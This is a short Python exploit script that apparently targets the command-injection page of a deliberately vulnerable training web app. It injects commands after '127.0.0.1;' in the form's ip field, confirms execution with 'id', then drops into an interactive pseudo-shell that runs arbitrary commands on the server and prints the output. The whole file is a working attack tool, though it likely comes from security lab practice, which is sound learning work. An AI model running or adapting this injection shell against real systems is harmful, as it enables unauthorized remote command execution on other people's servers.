import requests

url = "http://proxy-app:8080/vulnerabilities/exec/"
cookies = {
    "PHPSESSID": "80bpeornlbr3th8prdabcqahl7",
    "security": "low"
}

def send_cmd(cmd):
    payload = f"127.0.0.1; {cmd}"
    data = {
        "ip": payload,
        "Submit": "Submit"
    }
    r = requests.post(url, data=data, cookies=cookies)
    return r.text

print("[*] Testing for Command Injection...")
test_response = send_cmd("id")

if "uid=" in test_response:
    print("[+] CMDi vulnerability confirmed!")
    print(test_response.split("<pre>")[1].split("</pre>")[0])
    print("\n[~] Entering pseudo-shell mode. Type 'exit' to quit.\n")
    
    while True:
        cmd = input("cmdi-shell$ ")
        if cmd.lower() in ["exit", "quit"]:
            break
        result = send_cmd(cmd)
        try:
            output = result.split("<pre>")[1].split("</pre>")[0]
        except IndexError:
            output = "[!] Unexpected response or blocked."
        print(output)
else:
    print("[-] No CMDi detected or blocked.")
